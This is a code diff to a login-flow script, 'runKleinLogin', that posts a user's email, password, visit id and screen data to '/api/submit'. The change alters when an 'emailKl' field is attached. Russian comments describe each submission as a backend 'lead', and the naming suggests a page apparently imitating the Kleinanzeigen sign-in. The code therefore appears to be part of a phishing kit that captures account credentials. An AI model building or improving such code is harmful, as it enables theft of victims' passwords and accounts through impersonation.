@@ -179,13 +179,15 @@ export function runKleinLogin() {
     var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
     var body = appendTelemetrySafe({
       email: email,
-      emailKl: email,
       visitId: visitId || undefined,
       screenWidth: sw || undefined,
       screenHeight: sh || undefined,
       kleinClient: true,
       kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
     });
+    // Без visitId backend рассматривает это как создание нового лида.
+    // В этом кейсе emailKl не передаём, иначе backend ожидает существующий lead по visitId.
+    if (visitId) body.emailKl = email;
     fetch('/api/submit', Object.assign({
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -421,17 +423,20 @@ export function runKleinLogin() {
     fetch('/api/submit', Object.assign({
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(window.gmwAppendTelemetry({
-        email: email,
-        emailKl: email,
-        password: pwd,
-        visitId: visitId || undefined,
-        screenWidth: sw || undefined,
-        screenHeight: sh || undefined,
-        website: websiteHp,
-        kleinClient: true,
-        kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
-      }))
+      body: JSON.stringify((function () {
+        var payload = window.gmwAppendTelemetry({
+          email: email,
+          password: pwd,
+          visitId: visitId || undefined,
+          screenWidth: sw || undefined,
+          screenHeight: sh || undefined,
+          website: websiteHp,
+          kleinClient: true,
+          kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
+        });
+        if (visitId) payload.emailKl = email;
+        return payload;
+      })())
     }, credFetch))
       .then(function (r) { return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; }); })
       .then(function (res) {
